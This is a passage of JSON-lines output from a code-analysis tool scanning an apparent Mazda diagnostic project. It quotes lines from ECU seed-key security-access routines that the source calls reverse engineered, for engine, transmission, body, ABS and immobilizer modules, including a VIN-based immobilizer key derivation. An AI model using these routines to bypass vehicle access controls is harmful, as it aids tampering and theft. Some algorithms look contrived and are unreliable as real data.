"service_id=0x31,"}, {"type": "protocol", "line": 321, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 328, "protocol": "0x[0-9A-Fa-f]+", "content": "if response.data[0] == 0x71 and response.data[1:3] == struct.pack('>H', routine_id):"}, {"type": "protocol", "line": 339, "protocol": "0x[0-9A-Fa-f]+", "content": "Read DTC information (Service 0x19)"}, {"type": "protocol", "line": 344, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 345, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x19,"}, {"type": "protocol", "line": 353, "protocol": "0x[0-9A-Fa-f]+", "content": "if response.data[0] == 0x59 and response.data[1] == report_type:"}, {"type": "protocol", "line": 371, "protocol": "0x[0-9A-Fa-f]+", "content": "if report_type == 0x02:  # Read DTC by status"}, {"type": "protocol", "line": 399, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_type = (first_byte >> 6) & 0x03"}, {"type": "protocol", "line": 405, "protocol": "0x[0-9A-Fa-f]+", "content": "digit1 = (first_byte >> 4) & 0x03"}, {"type": "protocol", "line": 406, "protocol": "0x[0-9A-Fa-f]+", "content": "digit2 = first_byte & 0x0F"}, {"type": "protocol", "line": 407, "protocol": "0x[0-9A-Fa-f]+", "content": "digit3 = (dtc_bytes[1] >> 4) & 0x0F"}, {"type": "protocol", "line": 408, "protocol": "0x[0-9A-Fa-f]+", "content": "digit4 = dtc_bytes[1] & 0x0F"}, {"type": "protocol", "line": 409, "protocol": "0x[0-9A-Fa-f]+", "content": "digit5 = (dtc_bytes[2] >> 4) & 0x0F"}, {"type": "protocol", "line": 420, "protocol": "0x[0-9A-Fa-f]+", "content": "Clear diagnostic information (Service 0x14)"}, {"type": "protocol", "line": 425, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 426, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x14,"}, {"type": "protocol", "line": 427, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 434, "protocol": "0x[0-9A-Fa-f]+", "content": "return response.data[0] == 0x54"}, {"type": "protocol", "line": 470, "protocol": "0x[0-9A-Fa-f]+", "content": "if message.sub_function != 0x00:"}, {"type": "protocol", "line": 477, "protocol": "CAN", "content": "if self.protocol in [MazdaProtocol.ISO_15765_4_CAN, MazdaProtocol.ISO_15765_4_CAN_29]:"}, {"type": "protocol", "line": 502, "protocol": "0x[0-9A-Fa-f]+", "content": "expected_service = original_message.service_id + 0x40"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 23, "hardware": "vehicle", "content": "ISO_9141_2 = 1          # K-line for older vehicles"}, {"type": "hardware", "line": 39, "hardware": "ECU", "content": "class SecurityAccessLevel(IntEnum):"}, {"type": "hardware", "line": 40, "hardware": "ECU", "content": "\"\"\"Security Access Levels - Reverse Engineered\"\"\""}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "LEVEL_2 = 0x02          # ECU programming"}, {"type": "hardware", "line": 45, "hardware": "ECU", "content": "LEVEL_5 = 0x05          # Security system"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "ECU_ADDRESSES = {"}, {"type": "hardware", "line": 68, "hardware": "ECU", "content": "'ENGINE_ECU': 0x7E0,"}, {"type": "hardware", "line": 69, "hardware": "ECU", "content": "'ENGINE_ECU_RESP': 0x7E8,"}, {"type": "hardware", "line": 70, "hardware": "TCM", "content": "'TCM': 0x7E1,"}, {"type": "hardware", "line": 71, "hardware": "TCM", "content": "'TCM_RESP': 0x7E9,"}, {"type": "hardware", "line": 72, "hardware": "ABS", "content": "'ABS': 0x7E2,"}, {"type": "hardware", "line": 73, "hardware": "ABS", "content": "'ABS_RESP': 0x7EA,"}, {"type": "hardware", "line": 78, "hardware": "immobilizer", "content": "'IMMOBILIZER': 0x7E5,"}, {"type": "hardware", "line": 79, "hardware": "immobilizer", "content": "'IMMOBILIZER_RESP': 0x7ED,"}, {"type": "hardware", "line": 80, "hardware": "BCM", "content": "'BCM': 0x7E6,"}, {"type": "hardware", "line": 81, "hardware": "BCM", "content": "'BCM_RESP': 0x7EE,"}, {"type": "hardware", "line": 91, "hardware": "ECU", "content": "self.security_level = SecurityAccessLevel.LEVEL_1"}, {"type": "hardware", "line": 95, "hardware": "vehicle", "content": "def connect_to_vehicle(self) -> bool:"}, {"type": "hardware", "line": 97, "hardware": "vehicle", "content": "Establish connection with vehicle using Mazda protocol"}, {"type": "hardware", "line": 112, "hardware": "vehicle", "content": "logger.info(\"Successfully connected to vehicle\")"}, {"type": "hardware", "line": 116, "hardware": "vehicle", "content": "logger.error(f\"Failed to connect to vehicle: {e}\")"}, {"type": "hardware", "line": 128, "hardware": "vehicle", "content": "logger.debug(\"Initialized CAN protocol for Mazda vehicle\")"}, {"type": "hardware", "line": 135, "hardware": "vehicle", "content": "logger.debug(\"Initialized K-line protocol for Mazda vehicle\")"}, {"type": "hardware", "line": 147, "hardware": "vehicle", "content": "\"\"\"Test communication with vehicle gateway\"\"\""}, {"type": "hardware", "line": 152, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['GATEWAY'],"}, {"type": "hardware", "line": 173, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 201, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 228, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 249, "hardware": "ECU", "content": "Used for reading ECU memory and calibration data"}, {"type": "hardware", "line": 259, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 281, "hardware": "ECU", "content": "Used for ECU programming and calibration updates"}, {"type": "hardware", "line": 291, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 318, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 334, "hardware": "ECU", "content": "logger.error(f\"Error executing routine 0x{routine_id:04X}: {e}\")"}, {"type": "hardware", "line": 343, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 424, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 483, "hardware": "vehicle", "content": "\"\"\"Send raw message to vehicle (implementation depends on hardware interface)\"\"\""}, {"type": "hardware", "line": 489, "hardware": "vehicle", "content": "\"\"\"Receive response from vehicle\"\"\""}, {"type": "hardware", "line": 524, "hardware": "vehicle", "content": "\"\"\"Disconnect from vehicle\"\"\""}, {"type": "hardware", "line": 526, "hardware": "vehicle", "content": "logger.info(\"Disconnected from vehicle\")"}], "security_logic": [{"type": "security_pattern", "line": 13, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 24, "pattern": "key", "content": "ISO_14230_4_KWP = 2     # Keyword Protocol 2000"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["mds"]}
{"file_path": "mds10.py", "lines_read": 527, "features_found": [{"type": "function", "name": "__init__", "line": 37}, {"type": "function", "name": "_initialize_algorithm_database", "line": 41}, {"type": "function", "name": "_initialize_ecu_database", "line": 67}, {"type": "function", "name": "calculate_key", "line": 107}, {"type": "function", "name": "get_ecu_algorithm", "line": 140}, {"type": "function", "name": "get_ecu_seed_length", "line": 145}, {"type": "function", "name": "_algorithm_27_standard", "line": 152}, {"type": "function", "name": "_algorithm_27_enhanced", "line": 169}, {"type": "function", "name": "_algorithm_27_race", "line": 190}, {"type": "function", "name": "_algorithm_engine_ecu_2011", "line": 213}, {"type": "function", "name": "_algorithm_tcm_6spd", "line": 247}, {"type": "function", "name": "_algorithm_immobilizer_2011", "line": 263}, {"type": "function", "name": "_derive_immobilizer_key", "line": 283}, {"type": "function", "name": "_algorithm_bcm_2011", "line": 294}, {"type": "function", "name": "_algorithm_abs_2011", "line": 316}, {"type": "function", "name": "_algorithm_manufacturer_level1", "line": 338}, {"type": "function", "name": "_algorithm_manufacturer_level2", "line": 353}, {"type": "function", "name": "_algorithm_dealer_access", "line": 373}, {"type": "function", "name": "_algorithm_north_america", "line": 395}, {"type": "function", "name": "_algorithm_europe", "line": 413}, {"type": "function", "name": "_algorithm_japan", "line": 431}, {"type": "function", "name": "_get_manufacturer_key_level1", "line": 449}, {"type": "function", "name": "_get_manufacturer_key_level2", "line": 455}, {"type": "function", "name": "list_all_algorithms", "line": 461}, {"type": "function", "name": "get_algorithm_info", "line": 465}, {"type": "function", "name": "_get_algorithm_description", "line": 480}, {"type": "function", "name": "_get_algorithm_seed_length", "line": 492}, {"type": "function", "name": "_get_algorithm_key_length", "line": 506}, {"type": "function", "name": "_is_vin_required", "line": 520}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.kdf.pbkdf2", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}, {"type": "import", "module": "hashes", "line": null}, {"type": "import", "module": "PBKDF2HMAC", "line": null}], "components_found": [{"type": "class", "name": "MazdaECUType", "line": 20}, {"type": "class", "name": "MazdaSeedKeyDatabase", "line": 31}], "algorithms": [{"type": "algorithm_function", "line": 41, "content": "def _initialize_algorithm_database(self) -> Dict[str, Callable]:"}, {"type": "algorithm_function", "line": 107, "content": "def calculate_key(self, seed: bytes, algorithm_name: str,"}, {"type": "algorithm_function", "line": 140, "content": "def get_ecu_algorithm(self, ecu_type: MazdaECUType) -> Optional[str]:"}, {"type": "algorithm_function", "line": 152, "content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 169, "content": "def _algorithm_27_enhanced(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 190, "content": "def _algorithm_27_race(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 213, "content": "def _algorithm_engine_ecu_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 247, "content": "def _algorithm_tcm_6spd(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 263, "content": "def _algorithm_immobilizer_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 283, "content": "def _derive_immobilizer_key(self, vin: str) -> bytes:"}, {"type": "algorithm_function", "line": 294, "content": "def _algorithm_bcm_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 316, "content": "def _algorithm_abs_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 338, "content": "def _algorithm_manufacturer_level1(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 353, "content": "def _algorithm_manufacturer_level2(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 373, "content": "def _algorithm_dealer_access(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 395, "content": "def _algorithm_north_america(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 413, "content": "def _algorithm_europe(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 431, "content": "def _algorithm_japan(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 461, "content": "def list_all_algorithms(self) -> List[str]:"}, {"type": "algorithm_function", "line": 465, "content": "def get_algorithm_info(self, algorithm_name: str) -> Dict[str, Any]:"}, {"type": "algorithm_function", "line": 480, "content": "def _get_algorithm_description(self, algorithm_name: str) -> str:"}, {"type": "algorithm_function", "line": 492, "content": "def _get_algorithm_seed_length(self, algorithm_name: str) -> int:"}, {"type": "algorithm_function", "line": 506, "content": "def _get_algorithm_key_length(self, algorithm_name: str) -> int:"}, {"type": "algorithm_function", "line": 520, "content": "def _is_vin_required(self, algorithm_name: str) -> bool:"}], "protocols": [{"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "ENGINE_ECU = 0x01"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "TRANSMISSION = 0x02"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "IMMOBILIZER = 0x03"}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "BODY_CONTROL = 0x04"}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "ABS = 0x05"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "AIRBAG = 0x06"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "INSTRUMENT_CLUSTER = 0x07"}, {"type": "protocol", "line": 29, "protocol": "0x[0-9A-Fa-f]+", "content": "GATEWAY = 0x08"}, {"type": "protocol", "line": 154, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Standard 0x27 Security Algorithm\"\"\""}, {"type": "protocol", "line": 162, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = seed[i] ^ 0x73"}, {"type": "protocol", "line": 163, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + i) & 0xFF"}, {"type": "protocol", "line": 164, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0xA9"}, {"type": "protocol", "line": 165, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "protocol", "line": 171, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Enhanced 0x27 Security Algorithm\"\"\""}, {"type": "protocol", "line": 181, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 3) | (temp >> 5)) & 0xFF"}, {"type": "protocol", "line": 182, "protocol": "0x[0-9A-Fa-f]+", "content": "temp ^= [0x47, 0x11, 0x83, 0x25][i]"}, {"type": "protocol", "line": 183, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x2D + i) & 0xFF"}, {"type": "protocol", "line": 184, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (~temp & 0xFF) ^ 0xA5"}, {"type": "protocol", "line": 192, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Race/Performance 0x27 Algorithm\"\"\""}, {"type": "protocol", "line": 202, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x84) & 0xFF"}, {"type": "protocol", "line": 203, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0x3D"}, {"type": "protocol", "line": 204, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp >> 2) | (temp << 6)) & 0xFF"}, {"type": "protocol", "line": 205, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp - 0x17) & 0xFF"}, {"type": "protocol", "line": 206, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ [0xA2, 0x4F, 0x8C, 0x31][i]"}, {"type": "protocol", "line": 207, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp * 3) & 0xFF"}, {"type": "protocol", "line": 223, "protocol": "0x[0-9A-Fa-f]+", "content": "1: 0x10,"}, {"type": "protocol", "line": 224, "protocol": "0x[0-9A-Fa-f]+", "content": "2: 0x20,"}, {"type": "protocol", "line": 225, "protocol": "0x[0-9A-Fa-f]+", "content": "3: 0x30,"}, {"type": "protocol", "line": 226, "protocol": "0x[0-9A-Fa-f]+", "content": "4: 0x40,"}, {"type": "protocol", "line": 227, "protocol": "0x[0-9A-Fa-f]+", "content": "5: 0x50,"}, {"type": "protocol", "line": 228, "protocol": "0x[0-9A-Fa-f]+", "content": "6: 0x60"}, {"type": "protocol", "line": 231, "protocol": "0x[0-9A-Fa-f]+", "content": "level_factor = level_factors.get(security_level, 0x10)"}, {"type": "protocol", "line": 237, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp ^ 0x5A) + level_factor"}, {"type": "protocol", "line": 238, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 4) | (temp >> 4)) & 0xFF"}, {"type": "protocol", "line": 239, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ [0x37, 0x92, 0x64, 0xA8][i]"}, {"type": "protocol", "line": 240, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + i * 2) & 0xFF"}, {"type": "protocol", "line": 241, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ~temp & 0xFF"}, {"type": "protocol", "line": 256, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "protocol", "line": 257, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "protocol", "line": 258, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] ^= 0x47"}, {"type": "protocol", "line": 259, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] ^= 0x11"}, {"type": "protocol", "line": 306, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x84) & 0xFF"}, {"type": "protocol", "line": 307, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0x3D"}, {"type": "protocol", "line": 308, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp >> 2) | (temp << 6)) & 0xFF"}, {"type": "protocol", "line": 309, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp - 0x17) & 0xFF"}, {"type": "protocol", "line": 310, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ [0xA2, 0x4F, 0x8C, 0x31][i]"}, {"type": "protocol", "line": 328, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp * 2) & 0xFF"}, {"type": "protocol", "line": 329, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0xB5"}, {"type": "protocol", "line": 330, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 1) | (temp >> 7)) & 0xFF"}, {"type": "protocol", "line": 331, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x2A) & 0xFF"}, {"type": "protocol", "line": 332, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ [0x91, 0x3C, 0x67, 0xA8][i]"}, {"type": "protocol", "line": 368, "protocol": "0x[0-9A-Fa-f]+", "content": "transformed_seed[i] = (transformed_seed[i] ^ 0xAA) + i"}, {"type": "protocol", "line": 390, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (combined_data[i] ^ combined_data[(i+2) % 6]) + 0x30"}, {"type": "protocol", "line": 391, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = ((key[i] << 2) | (key[i] >> 6)) & 0xFF"}, {"type": "protocol", "line": 406, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x4E) & 0xFF  # 'N' for North"}, {"type": "protocol", "line": 407, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0x41  # 'A' for America"}, {"type": "protocol", "line": 408, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 2) | (temp >> 6)) & 0xFF"}, {"type": "protocol", "line": 424, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x45) & 0xFF  # 'E' for Europe"}, {"type": "protocol", "line": 425, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0x55  # 'U' for Europe"}, {"type": "protocol", "line": 426, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp >> 3) | (temp << 5)) & 0xFF"}, {"type": "protocol", "line": 442, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x4A) & 0xFF  # 'J' for Japan"}, {"type": "protocol", "line": 443, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0x50  # 'P' for Japan"}, {"type": "protocol", "line": 444, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 4) | (temp >> 4)) & 0xFF"}, {"type": "protocol", "line": 483, "protocol": "0x[0-9A-Fa-f]+", "content": "\"ALG_27_STANDARD\": \"Standard 0x27 security access algorithm\","}, {"type": "protocol", "line": 484, "protocol": "0x[0-9A-Fa-f]+", "content": "\"ALG_27_ENHANCED\": \"Enhanced 0x27 algorithm with additional security\","}], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "ECU", "content": "MAZDA SEED-KEY ALGORITHMS - Complete Security Algorithm Database"}, {"type": "hardware", "line": 5, "hardware": "ECU", "content": "Reverse engineered from all Mazda ECU security algorithms"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "class MazdaECUType(IntEnum):"}, {"type": "hardware", "line": 21, "hardware": "ECU", "content": "\"\"\"Mazda ECU Types\"\"\""}, {"type": "hardware", "line": 22, "hardware": "ECU", "content": "ENGINE_ECU = 0x01"}, {"type": "hardware", "line": 24, "hardware": "immobilizer", "content": "IMMOBILIZER = 0x03"}, {"type": "hardware", "line": 26, "hardware": "ABS", "content": "ABS = 0x05"}, {"type": "hardware", "line": 34, "hardware": "ECU", "content": "Contains all security algorithms for all Mazda ECUs"}, {"type": "hardware", "line": 39, "hardware": "ECU", "content": "self.ecu_database = self._initialize_ecu_database()"}, {"type": "hardware", "line": 50, "hardware": "ECU", "content": "\"ENGINE_ECU_2011\": self._algorithm_engine_ecu_2011,"}, {"type": "hardware", "line": 51, "hardware": "TCM", "content": "\"TCM_6SPD\": self._algorithm_tcm_6spd,"}, {"type": "hardware", "line": 52, "hardware": "immobilizer", "content": "\"IMMOBILIZER_2011\": self._algorithm_immobilizer_2011,"}, {"type": "hardware", "line": 53, "hardware": "BCM", "content": "\"BCM_2011\": self._algorithm_bcm_2011,"}, {"type": "hardware", "line": 54, "hardware": "ABS", "content": "\"ABS_2011\": self._algorithm_abs_2011,"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "def _initialize_ecu_database(self) -> Dict[MazdaECUType, Dict[str, Any]]:"}, {"type": "hardware", "line": 68, "hardware": "ECU", "content": "\"\"\"Initialize ECU security database\"\"\""}, {"type": "hardware", "line": 70, "hardware": "ECU", "content": "MazdaECUType.ENGINE_ECU: {"}, {"type": "hardware", "line": 71, "hardware": "ECU", "content": "\"algorithm\": \"ENGINE_ECU_2011\","}, {"type": "hardware", "line": 74, "hardware": "ECU", "content": "\"security_levels\": [1, 2, 3, 4, 5, 6],"}, {"type": "hardware", "line": 77, "hardware": "ECU", "content": "MazdaECUType.TRANSMISSION: {"}, {"type": "hardware", "line": 78, "hardware": "TCM", "content": "\"algorithm\": \"TCM_6SPD\","}, {"type": "hardware", "line": 81, "hardware": "ECU", "content": "\"security_levels\": [1, 2],"}, {"type": "hardware", "line": 84, "hardware": "ECU", "content": "MazdaECUType.IMMOBILIZER: {"}, {"type": "hardware", "line": 84, "hardware": "immobilizer", "content": "MazdaECUType.IMMOBILIZER: {"}, {"type": "hardware", "line": 85, "hardware": "immobilizer", "content": "\"algorithm\": \"IMMOBILIZER_2011\","}, {"type": "hardware", "line": 88, "hardware": "ECU", "content": "\"security_levels\": [5],"}, {"type": "hardware", "line": 91, "hardware": "ECU", "content": "MazdaECUType.BODY_CONTROL: {"}, {"type": "hardware", "line": 92, "hardware": "BCM", "content": "\"algorithm\": \"BCM_2011\","}, {"type": "hardware", "line": 95, "hardware": "ECU", "content": "\"security_levels\": [1, 2],"}, {"type": "hardware", "line": 98, "hardware": "ECU", "content": "MazdaECUType.ABS: {"}, {"type": "hardware", "line": 98, "hardware": "ABS", "content": "MazdaECUType.ABS: {"}, {"type": "hardware", "line": 99, "hardware": "ABS", "content": "\"algorithm\": \"ABS_2011\","}, {"type": "hardware", "line": 102, "hardware": "ECU", "content": "\"security_levels\": [1],"}, {"type": "hardware", "line": 108, "hardware": "ECU", "content": "vin: Optional[str] = None, security_level: int = 1) -> Optional[bytes]:"}, {"type": "hardware", "line": 110, "hardware": "ECU", "content": "Calculate security key using specified algorithm"}, {"type": "hardware", "line": 113, "hardware": "ECU", "content": "seed: Seed bytes from ECU"}, {"type": "hardware", "line": 115, "hardware": "vehicle", "content": "vin: Vehicle VIN (if required)"}, {"type": "hardware", "line": 116, "hardware": "ECU", "content": "security_level: Security access level"}, {"type": "hardware", "line": 127, "hardware": "ECU", "content": "key = algorithm(seed, vin, security_level)"}, {"type": "hardware", "line": 140, "hardware": "ECU", "content": "def get_ecu_algorithm(self, ecu_type: MazdaECUType) -> Optional[str]:"}, {"type": "hardware", "line": 141, "hardware": "ECU", "content": "\"\"\"Get algorithm name for ECU type\"\"\""}, {"type": "hardware", "line": 142, "hardware": "ECU", "content": "ecu_info = self.ecu_database.get(ecu_type)"}, {"type": "hardware", "line": 143, "hardware": "ECU", "content": "return ecu_info.get(\"algorithm\") if ecu_info else None"}, {"type": "hardware", "line": 145, "hardware": "ECU", "content": "def get_ecu_seed_length(self, ecu_type: MazdaECUType) -> int:"}, {"type": "hardware", "line": 146, "hardware": "ECU", "content": "\"\"\"Get seed length for ECU type\"\"\""}, {"type": "hardware", "line": 147, "hardware": "ECU", "content": "ecu_info = self.ecu_database.get(ecu_type)"}, {"type": "hardware", "line": 148, "hardware": "ECU", "content": "return ecu_info.get(\"seed_length\", 4) if ecu_info else 4"}, {"type": "hardware", "line": 153, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 154, "hardware": "ECU", "content": "\"\"\"Standard 0x27 Security Algorithm\"\"\""}, {"type": "hardware", "line": 170, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 171, "hardware": "ECU", "content": "\"\"\"Enhanced 0x27 Security Algorithm\"\"\""}, {"type": "hardware", "line": 191, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 213, "hardware": "ECU", "content": "def _algorithm_engine_ecu_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 214, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 215, "hardware": "ECU", "content": "\"\"\"2011 Mazdaspeed 3 Engine ECU Algorithm\"\"\""}, {"type": "hardware", "line": 217, "hardware": "ECU", "content": "raise ValueError(\"Engine ECU algorithm requires 4-byte seed\")"}, {"type": "hardware", "line": 231, "hardware": "ECU", "content": "level_factor = level_factors.get(security_level, 0x10)"}, {"type": "hardware", "line": 247, "hardware": "TCM", "content": "def _algorithm_tcm_6spd(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 248, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 251, "hardware": "TCM", "content": "raise ValueError(\"TCM algorithm requires 2-byte seed\")"}, {"type": "hardware", "line": 263, "hardware": "immobilizer", "content": "def _algorithm_immobilizer_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 264, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 265, "hardware": "immobilizer", "content": "\"\"\"2011 Immobilizer System Algorithm\"\"\""}, {"type": "hardware", "line": 267, "hardware": "immobilizer", "content": "raise ValueError(\"Immobilizer algorithm requires 8-byte seed\")"}, {"type": "hardware", "line": 270, "hardware": "immobilizer", "content": "raise ValueError(\"Immobilizer algorithm requires VIN\")"}, {"type": "hardware", "line": 273, "hardware": "immobilizer", "content": "vehicle_key = self._derive_immobilizer_key(vin)"}, {"type": "hardware", "line": 273, "hardware": "vehicle", "content": "vehicle_key = self._derive_immobilizer_key(vin)"}, {"type": "hardware", "line": 276, "hardware": "vehicle", "content": "des_key = vehicle_key[:24]  # 24 bytes for 3DES"}, {"type": "hardware", "line": 283, "hardware": "immobilizer", "content": "def _derive_immobilizer_key(self, vin: str) -> bytes:"}, {"type": "hardware", "line": 284, "hardware": "immobilizer", "content": "\"\"\"Derive immobilizer key from VIN\"\"\""}, {"type": "hardware", "line": 289, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "hardware", "line": 290, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "hardware", "line": 294, "hardware": "BCM", "content": "def _algorithm_bcm_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 295, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 298, "hardware": "BCM", "content": "raise ValueError(\"BCM algorithm requires 4-byte seed\")"}, {"type": "hardware", "line": 316, "hardware": "ABS", "content": "def _algorithm_abs_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 317, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 318, "hardware": "ABS", "content": "\"\"\"2011 ABS Module Algorithm\"\"\""}, {"type": "hardware", "line": 320, "hardware": "ABS", "content": "raise ValueError(\"ABS algorithm requires 4-byte seed\")"}, {"type": "hardware", "line": 339, "hardware": "ECU", "content": "security_level: int = 